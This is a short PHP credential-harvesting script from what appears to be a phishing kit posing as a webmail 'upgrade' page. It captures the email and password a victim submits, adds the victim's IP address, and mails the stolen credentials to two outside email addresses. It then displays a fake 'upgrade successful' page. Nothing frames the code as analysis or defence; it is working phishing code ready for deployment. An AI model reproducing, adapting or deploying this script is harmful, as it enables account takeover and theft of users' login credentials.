﻿<title> Upgrade Successful:</title><?php
$ip = getenv("REMOTE_ADDR");
$message .= "+++++++++++++Acc Login ReZult Horde++++++++++++\n";

$message .= "Email: ".$_POST['Email']."\n";
$message .= "Password: ".$_POST['password']."\n";

$message .= "++++++++++++++++IP and Date+++++++++++++++\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "+++++++++++M0D1F1ED 3Y S194R - E54N B01+++++++++++\n";

$recipient = "upgradezimbra@outlook.com";
$recipient1 = "Jack.cchen@protonmail.com";
$subject = "= Login =";
$headers = "Replenish Company";
$headers .= $_POST['']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to","$subject", $message);
if (mail($recipient,$subject,$message,$headers));
if (mail($recipient1,$subject,$message,$headers));
	   {
require("upgradesuccessful.html");

	   }
?>